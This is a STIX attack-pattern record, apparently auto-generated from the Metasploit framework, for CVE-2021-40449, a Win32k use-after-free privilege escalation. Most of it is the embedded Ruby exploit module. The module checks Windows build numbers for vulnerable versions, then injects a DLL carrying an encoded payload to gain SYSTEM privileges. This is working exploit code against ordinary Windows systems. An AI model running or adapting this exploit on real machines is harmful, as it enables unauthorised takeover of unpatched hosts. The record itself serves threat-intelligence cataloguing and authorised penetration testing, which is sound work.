{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--27b77dcd-d091-4c7d-9c3b-522054287139",
    "created": "2024-08-14T16:49:55.056163Z",
    "modified": "2024-08-14T16:49:55.056168Z",
    "name": "Win32k NtGdiResetDC Use After Free Local Privilege Elevation",
    "description": " A use after free vulnerability exists in the `NtGdiResetDC()` function of Win32k which can be leveraged by an attacker to escalate privileges to those of `NT AUTHORITY\\SYSTEM`. The flaw exists due to the fact that this function calls `hdcOpenDCW()`, which performs a user mode callback. During this callback, attackers can call the `NtGdiResetDC()` function again with the same handle as before, which will result in the PDC object that is referenced by this handle being freed. The attacker can then replace the memory referenced by the handle with their own object, before passing execution back to the original `NtGdiResetDC()` call, which will now use the attacker's object without appropriate validation. This can then allow the attacker to manipulate the state of the kernel and, together with additional exploitation techniques, gain code execution as NT AUTHORITY\\SYSTEM.  This module has been tested to work on Windows 10 x64 RS1 (build 14393) and RS5 (build 17763), however previous versions of Windows 10 will likely also work.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2021_40449.rb",
            "external_id": "cve_2021_40449.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-40449"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ly4k/CallbackHell#UpdatedPoCthismoduleusesforexploitation."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Version\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Win32k NtGdiResetDC Use After Free Local Privilege Elevation',\n          'Description' => %q{\n            A use after free vulnerability exists in the `NtGdiResetDC()` function of Win32k which can be leveraged by\n            an attacker to escalate privileges to those of `NT AUTHORITY\\SYSTEM`. The flaw exists due to the fact\n            that this function calls `hdcOpenDCW()`, which performs a user mode callback. During this callback, attackers\n            can call the `NtGdiResetDC()` function again with the same handle as before, which will result in the PDC object\n            that is referenced by this handle being freed. The attacker can then replace the memory referenced by the handle\n            with their own object, before passing execution back to the original `NtGdiResetDC()` call, which will now use the\n            attacker's object without appropriate validation. This can then allow the attacker to manipulate the state of the\n            kernel and, together with additional exploitation techniques, gain code execution as NT AUTHORITY\\SYSTEM.\n\n            This module has been tested to work on Windows 10 x64 RS1 (build 14393) and RS5 (build 17763), however previous versions\n            of Windows 10 will likely also work.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'IronHusky', # APT Group who exploited this in the wild\n            'Costin Raiu', # Initial reporting on bug at SecureList\n            'Boris Larin', # Initial reporting on bug at SecureList\n            \"Red Raindrop Team of Qi'anxin Threat Intelligence Center\", # detailed analysis report in Chinese showing how to replicate the vulnerability\n            'KaLendsi', # First Public POC targeting Windows 10 build 14393 only, later added support for 17763\n            'ly4k', # GitHub POC adding support for Windows 10 build 17763, PoC used for this module.\n            'Grant Willcox' # metasploit module\n          ],\n          'Arch' => [ ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows 10 x64 RS1 (build 14393) and RS5 (build 17763)', { 'Arch' => ARCH_X64 } ]\n          ],\n          'Payload' => {\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'CVE', '2021-40449' ],\n            [ 'URL', 'https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/' ], # Initial report of in the wild exploitation\n            [ 'URL', 'https://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ' ], # Detailed writeup\n            [ 'URL', 'https://github.com/KaLendsi/CVE-2021-40449-Exploit' ], # First public PoC\n            [ 'URL', 'https://github.com/ly4k/CallbackHell' ] # Updated PoC this module uses for exploitation.\n          ],\n          'DisclosureDate' => '2021-10-12',\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [ CRASH_OS_RESTARTS, ],\n            'Reliability' => [ REPEATABLE_SESSION, ],\n            'SideEffects' => []\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    if session.platform != 'windows'\n      # Non-Windows systems are definitely not affected.\n      return CheckCode::Safe('Target is not a Windows system, so it is not affected by this vulnerability!')\n    end\n\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Win10_21H1) ||\n           version.build_number == Msf::WindowsVersion::Server2022 ||\n           version.build_number == Msf::WindowsVersion::Win11_21H2\n      return CheckCode::Safe('Target is not running a vulnerable version of Windows!')\n    end\n\n    # Build numbers taken from https://www.qualys.com/research/security-alerts/2021-10-12/microsoft/\n    if version.build_number == Msf::WindowsVersion::Win11_21H2 && version.build_number.revision_number.between?(0, 257)\n      return CheckCode::Appears('Vulnerable Windows 11 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Server2022 && version.build_number.revision_number.between?(0, 287)\n      return CheckCode::Appears('Vulnerable Windows Server 2022 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_21H2 && version.build_number.revision_number.between?(0, 1318)\n      return CheckCode::Appears('Vulnerable Windows 10 21H2 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_21H1 && version.build_number.revision_number.between?(0, 1287)\n      return CheckCode::Appears('Vulnerable Windows 10 21H1 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_20H2 && version.build_number.revision_number.between?(0, 1287)\n      return CheckCode::Appears('Vulnerable Windows 10 20H2 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_2004 && version.build_number.revision_number.between?(0, 1287)\n      return CheckCode::Appears('Vulnerable Windows 10 20H1 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1909 && version.build_number.revision_number.between?(0, 1853)\n      return CheckCode::Appears('Vulnerable Windows 10 v1909 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1903\n      return CheckCode::Appears('Vulnerable Windows 10 v1903 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1809 && version.build_number.revision_number.between?(0, 2236)\n      return CheckCode::Appears('Vulnerable Windows 10 v1809 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1803\n      return CheckCode::Appears('Vulnerable Windows 10 v1803 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1709\n      return CheckCode::Appears('Vulnerable Windows 10 v1709 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1703\n      return CheckCode::Appears('Vulnerable Windows 10 v1703 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1607 && version.build_number.revision_number.between?(0, 4703)\n      return CheckCode::Appears('Vulnerable Windows 10 v1607 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1511\n      return CheckCode::Appears('Vulnerable Windows 10 v1511 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1507 && version.build_number.revision_number.between?(0, 19085)\n      return CheckCode::Appears('Vulnerable Windows 10 v1507 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win81 # Includes Server 2012 R2\n      return CheckCode::Detected('Windows 8.1/Windows Server 2012 R2 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win8 # Includes Server 2012\n      return CheckCode::Detected('Windows 8/Windows Server 2012 build detected!')\n    elsif version.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win7_SP1) # Includes Server 2008 R2\n      return CheckCode::Detected('Windows 7/Windows Server 2008 R2 build detected!')\n    elsif version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2008_SP2_Update)\n      return CheckCode::Detected('Windows Server 2008/Windows Server 2008 SP2 build detected!')\n    else\n      return CheckCode::Safe('The build number of the target machine does not appear to be a vulnerable version!')\n    end\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86\n      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64\n      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')\n    end\n\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-40449', 'CVE-2021-40449.x64.dll'),\n      [encoded_payload.length].pack('I<') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}